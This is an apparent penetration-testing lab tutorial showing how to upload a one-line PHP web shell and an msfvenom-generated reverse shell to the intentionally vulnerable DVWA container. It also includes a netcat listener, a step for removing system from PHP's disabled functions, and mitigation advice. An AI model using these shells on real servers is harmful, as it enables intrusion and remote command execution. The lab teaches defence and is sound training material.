<div class="rst-content">
          <div role="navigation" aria-label="Page navigation">

</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
             
  <section id="php-reverse-shell">
<h1>PHP Reverse shell</h1>

<section id="introduction">
<h2>Introduction</h2>
<p>One would think that modern installations have secured their implementation, however since this tasks
is left up to humans, we find many installations that have not been updated, and or secured.</p>
<p>This lab series documents approaches for various technologies.  Today, we are targeting an unsecured PHP
installation.</p>
</section>
<section id="setup">
<h2>Setup<a class="headerlink" href="#setup" title="Link to this heading"></a></h2>
<p>For the target I am using a docker image from: <a class="reference external" href="https://github.com/opsxcq/docker-vulnerable-dvwa">https://github.com/opsxcq/docker-vulnerable-dvwa</a>
It is an image with the intent of helping students learn about securing web installations.</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>docker<span class="w"> </span>run<span class="w"> </span>--rm<span class="w"> </span>-it<span class="w"> </span>-p<span class="w"> </span><span class="m">80</span>:80<span class="w"> </span>vulnerables/web-dvwa
</pre></div>
</div>
<ul class="simple">
<li><p>Login to the site with <a class="reference external" href="http://your_docker_IP">http://your_docker_IP</a> with the credentials <cite>admin/password</cite></p></li>
<li><p>Click the bottom button (create/reset) to finish the installation</p></li>
<li><p>Login again with the above credentials</p></li>
</ul>
<p>How this vulnerability is leveraged is by a server that allows the system command to be used in PHP.  Modern versions have
this disabled by default, by older installations, or installations that require this command to be
available may have this set to on.</p>
<p>From <cite>/etc/php.ini</cite></p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">disable_functions =exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source</span>
</pre></div>
</div>
<p>By removing the system function from this comma delimited list, you will enable the system command after the
next service restart.  This tutorial will focus on the system command, but as you can see there are many options.</p>
</section>
<section id="create-a-payload">
<h2>Create a payload<a class="headerlink" href="#create-a-payload" title="Link to this heading"></a></h2>
<p>We are going to create a payload (a file) to upload the server and see if we can run system commands.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">mkdir -P ~/labs/shells</span>
<span class="go">cd ~/labs/shells</span>
<span class="go">echo '&lt;?php system($_REQUEST['cmd']); ?&gt;' &gt; shell.php</span>
</pre></div>
</div>
<ul class="simple">
<li><p>Upload the shell by using the left menu and choosing <cite>File Upload</cite> and upload your created script.</p></li>
<li><p>The created file gets stored on the target in /hackable/uploads</p></li>
</ul>
<p>Navigate to the url: <a class="reference external" href="http://172.17.0.2/hackable/uploads/shell.php?cmd=whoami">http://172.17.0.2/hackable/uploads/shell.php?cmd=whoami</a> and you should see
<cite>www-data</cite>.  This is the output of the command whoami.</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>the cmd is the GET variable name you use as the request in your script, and the argument is
whoami, you can also use other system commands such as ls or cat as examples.</p>
</div>
</section>
<section id="using-msfvenom-to-create-a-more-complex-payload">
<h2>Using MSFVenom to create a more complex payload<a class="headerlink" href="#using-msfvenom-to-create-a-more-complex-payload" title="Link to this heading"></a></h2>
<ul class="simple">
<li><p>Prerequisite is to have metasploit installed.</p></li>
<li><p>Substitute your IP with the &lt;HOST_IP&gt; tag</p></li>
</ul>
<p><strong>Step 1</strong> Create a reverse shell with metasploit</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msfvenom -p php/reverse_php LHOST=&lt;HOST_IP&gt; LPORT=1234 -f raw &gt; reverse.php</span>
</pre></div>
</div>
<ul class="simple">
<li><p>Upload the shell by using the left menu and choosing <cite>File Upload</cite> and upload your created script.</p></li>
<li><p>The created file gets stored on the target in /hackable/uploads</p></li>
</ul>
<p><strong>Step 2</strong> Create a listener on your host machine with netcat</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nc -lnvp 1234</span>
</pre></div>
</div>
<ul class="simple">
<li><p>Execute the remote reverse shell by requesting the script : <a class="reference external" href="http:/">http:/</a>/&lt;HOST_IP&gt;/hackable/uploads/reverse.php</p></li>
<li><p>You should see a connection on your nc -lnvp 1234 output</p></li>
</ul>
</section>
<section id="mitigate-this-attack-vector">
<h2>Mitigate this Attack Vector<a class="headerlink" href="#mitigate-this-attack-vector" title="Link to this heading"></a></h2>
<p>The most effective way to protect against this type of attack:</p>
<ul class="simple">
<li><p>Adding system style commands to the disable_function list</p></li>
<li><p>Restricting uploads when not necessary</p></li>
<li><p>Checking file uploads for malicious content</p></li>
<li><p>Allowing only approved file extensions from being processed.</p></li>
<li><p>Using a WAF</p></li>
</ul>
</section>
<section id="references">
<h2>References<a class="headerlink" href="#references" title="Link to this heading"></a></h2>
<ul class="simple">
<li><p>PHP System commands: <a class="reference external" href="https://www.php.net/manual/en/function.system.php">https://www.php.net/manual/en/function.system.php</a></p></li>
<li><p>How to disable commands: <a class="reference external" href="https://www.cyberciti.biz/faq/linux-unix-apache-lighttpd-phpini-disable-functions/">https://www.cyberciti.biz/faq/linux-unix-apache-lighttpd-phpini-disable-functions/</a></p></li>
<li><p>Alternate shells: <a class="reference external" href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p></li>
</ul>
</section>
</section>


           </div>
          </div>
          <footer><div class="rst-footer-buttons" role="navigation" aria-label="Footer">
        <a href="../Labs.html" class="btn btn-neutral float-left" title="Labs" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
        <a href="../../CPTS/Certified%20Penetration%20Tester.html" class="btn btn-neutral float-right" title="Certified Penetration Tester" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
    </div>

  <hr>

  <div role="contentinfo">
    <p>© Copyright 2024, CelestialTech.ca.</p>
  </div>

  Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
    provided by <a href="https://readthedocs.org">Read the Docs</a>.
   

<a href="https://github.com/MrDogeBro/sphinx_rtd_dark_mode">Dark theme</a> provided by <a href="http://mrdogebro.com">MrDogeBro</a>.</footer>
        </div>